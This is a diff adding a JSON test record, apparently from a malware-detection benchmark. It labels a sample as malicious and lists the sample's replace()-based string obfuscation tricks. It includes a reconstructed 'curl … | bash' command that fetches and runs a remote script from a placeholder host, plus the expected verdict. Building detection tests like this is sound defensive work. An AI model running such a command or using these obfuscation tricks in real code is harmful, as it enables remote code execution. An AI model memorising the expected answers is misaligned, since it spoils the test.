@@ -1,0 +1,43 @@
+{
+  "sample_id": "adv-020-string-replace",
+  "test_category": "string_manipulation_obfuscation",
+  "primary_detection": {
+    "code": "STRING-004",
+    "name": "Character Replacement Obfuscation",
+    "description": "Malicious commands hidden using placeholder characters removed via replace() or regex",
+    "confidence": 0.91
+  },
+  "underlying_threats": [
+    {
+      "code": "DATA-002",
+      "name": "Remote Code Execution",
+      "description": "Downloads and executes remote payload scripts",
+      "confidence": 0.93
+    },
+    {
+      "code": "EXEC-003",
+      "name": "Dynamic Code Execution",
+      "description": "Uses exec() to run dynamically constructed code",
+      "confidence": 0.92
+    },
+    {
+      "code": "EXEC-001",
+      "name": "Shell Command Injection",
+      "description": "Executes shell commands via subprocess and os.system",
+      "confidence": 0.90
+    }
+  ],
+  "obfuscation_indicators": [
+    "Underscore placeholders: 'c_u_r_l'.replace('_', '')",
+    "X character placeholders in URLs",
+    "Numeric placeholders: 's1u1b1p1r1o1c1e1s1s'.replace('1', '')",
+    "Special character placeholders: '@', '##', '%%', '&&'",
+    "Chained multiple replace() calls",
+    "Regex substitution with re.sub() for pattern removal"
+  ],
+  "reconstructed_payload": "curl https://[REDACTED].example.com/script.sh | bash",
+  "expected_verdict": "确认恶意",
+  "verdict_reasoning": "Systematic use of placeholder characters and replace() operations to obscure malicious command keywords",
+  "risk_level": "critical",
+  "tags": ["obfuscation", "string-replace", "placeholder-chars", "regex", "remote-code-execution"]
+}
